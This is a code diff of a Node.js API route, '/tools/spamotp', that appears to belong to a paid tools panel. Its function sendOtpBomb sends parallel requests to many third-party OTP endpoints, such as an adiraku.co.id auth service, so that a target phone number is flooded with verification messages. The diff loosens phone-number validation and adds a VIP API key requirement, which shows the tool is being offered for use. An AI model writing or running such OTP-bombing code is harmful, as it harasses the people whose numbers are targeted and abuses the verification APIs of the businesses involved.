@@ -1,4 +1,4 @@
-const axios = require('axios');
+      const axios = require('axios');
 
 async function sendOtpBomb(phone) {
     if (phone.startsWith("0")) phone = "62" + phone.slice(1);
@@ -27,7 +27,6 @@ async function sendOtpBomb(phone) {
         { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
     ];
 
-    // Membuat array of promises untuk menembak semua API secara bersamaan (paralel)
     const tasks = otpEndpoints.map(async (ep) => {
         try {
             const config = {
@@ -36,7 +35,7 @@ async function sendOtpBomb(phone) {
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
                     ...(ep.headers || {}) 
                 },
-                timeout: 4000, // Batas waktu tunggu per-API diturunkan jadi 4 detik demi keamanan jalur panel
+                timeout: 4000, 
                 validateStatus: () => true 
             };
             
@@ -56,7 +55,6 @@ async function sendOtpBomb(phone) {
         }
     });
 
-    // Menjalankan semua request secara serentak
     const results = await Promise.allSettled(tasks);
 
     let success = 0;
@@ -81,7 +79,7 @@ async function sendOtpBomb(phone) {
 module.exports = {
     method: 'all', 
     path: '/tools/spamotp',
-    isApikey: true,
+    isApikey: true, // WAJIB DI SINI: Agar middleware server.js membaca bahwa rute ini diproteksi VIP
     handler: async (req, res) => {
         try {
             const phone = req.query?.phone || req.body?.phone;
@@ -101,11 +99,10 @@ module.exports = {
                 return res.status(400).json({
                     status: false,
                     creator: 'Rin imup',
-                    message: 'Nomor HP tidak valid. Pastikan hanya berisi angka minimal 9 digit.'
+                    message: 'Nomor HP tidak valid. Pastikan hanya berisi angka.'
                 });
             }
 
-            // Eksekusi fungsi paralel (hanya butuh waktu sekitar ~4 detik saja secara total)
             const result = await sendOtpBomb(cleanPhone);
 
             res.json({
@@ -137,7 +134,13 @@ module.exports = {
                 in: "query",
                 required: true,
                 description: "Nomor HP Target"
+            },
+            {
+                name: "apikey",
+                in: "query",
+                required: true,
+                description: "API Key VIP anda"
             }
         ]
     }
-};
+};  
